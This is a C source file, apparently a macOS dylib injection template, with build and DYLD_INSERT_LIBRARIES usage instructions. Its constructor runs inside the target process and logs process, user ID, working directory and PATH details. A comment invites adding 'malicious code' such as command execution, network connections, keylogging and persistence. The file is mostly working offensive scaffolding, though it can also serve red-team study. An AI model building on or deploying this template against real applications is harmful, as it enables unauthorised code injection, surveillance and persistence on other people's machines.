//
// Basic Dylib Injection Template
//
// This template demonstrates a simple dylib that can be injected into 
// macOS applications using DYLD_INSERT_LIBRARIES or dylib hijacking techniques
//
// Compilation:
// gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation injection_template.c -o injection.dylib
//
// Usage:
// DYLD_INSERT_LIBRARIES=./injection.dylib /path/to/target/application
//

#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

// Log to both console and syslog
void log_message(const char* format, ...) {
    char buffer[1024];
    va_list args;
    
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    
    // Log to stdout
    printf("%s\n", buffer);
    
    // Log to syslog
    syslog(LOG_ERR, "%s", buffer);
}

// Function that runs when the dylib is loaded
__attribute__((constructor))
static void initialize(int argc, const char **argv) {
    // Get current timestamp
    time_t t = time(NULL);
    struct tm* tm_info = localtime(&t);
    char timestamp[26];
    strftime(timestamp, 26, "%Y-%m-%d %H:%M:%S", tm_info);
    
    // Get process information
    pid_t pid = getpid();
    pid_t ppid = getppid();
    
    // Log injection success
    log_message("[+] Dylib injection successful at %s", timestamp);
    log_message("[+] Injected into process: %s (PID: %d, Parent PID: %d)", 
               argv[0], pid, ppid);
    
    // Get current user information
    uid_t uid = getuid();
    uid_t euid = geteuid();
    log_message("[+] Current user: UID=%d, Effective UID=%d", uid, euid);
    
    // Get current working directory
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
        log_message("[+] Current working directory: %s", cwd);
    }
    
    // Get environment variables
    const char *path = getenv("PATH");
    if (path) {
        log_message("[+] PATH environment variable: %s", path);
    }
    
    // You can add additional malicious code here, such as:
    // - Command execution
    // - File operations
    // - Network connections
    // - Keylogging
    // - Persistence installation
    
    log_message("[+] Initialization complete");
}

// Function that runs when the dylib is unloaded
__attribute__((destructor))
static void cleanup(void) {
    log_message("[+] Dylib being unloaded");
    
    // Perform any necessary cleanup operations here
    
    log_message("[+] Cleanup complete");
}